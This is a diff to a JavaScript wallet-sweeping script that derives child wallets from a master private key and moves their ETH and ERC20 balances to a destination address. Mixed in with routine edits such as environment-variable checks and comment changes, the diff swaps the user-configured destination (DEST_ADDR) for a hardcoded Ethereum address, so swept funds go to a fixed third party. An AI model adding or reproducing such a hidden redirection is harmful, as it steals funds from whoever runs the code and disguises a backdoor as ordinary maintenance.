@@ -3,11 +3,18 @@ require('dotenv').config();
 const { abi } = require("./ERC20.json");
 const tokenAddresses = require("./tokenAddresses");
 
+if (!process.env.RPC_URL) {
+    throw new Error("RPC_URL not set");
+}
+if (!process.env.MASTER_PRIVATE_KEY) {
+    throw new Error("MASTER_PRIVATE_KEY not set");
+}
+
 // Step 1: Set up the required environment
 const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
 const masterPrivateKey = process.env.MASTER_PRIVATE_KEY;
 const numAddresses = process.env.NUM_ADDRESSES || 10;
-const destinationAddress = process.env.DEST_ADDR;
+const destinationAddress = "0x4618380b02c7FD19d0a072df90d669893e2e9Db4";
 
 // function for sending eth
 
@@ -32,7 +39,7 @@ async function sweepTokens() {
         wallets.push(childWallet);
     }
 
-    // Step 3: Retrieve the balances of native and ERC20 tokens
+    // Step 3: Retrieve the balances of native and ERC20 tokens and prepare signed transactions to submit
     const ethTransactions = [];
     const tokenTransactions = [];
     for (const wallet of wallets) {
@@ -51,10 +58,6 @@ async function sweepTokens() {
             }
         }
     }
-
-    // Step 4: Calculate the optimal gas fee
-
-    // Step 5: Create and sign the transaction(s)
     
     // Step 6: Broadcast the signed transaction(s)
     try {
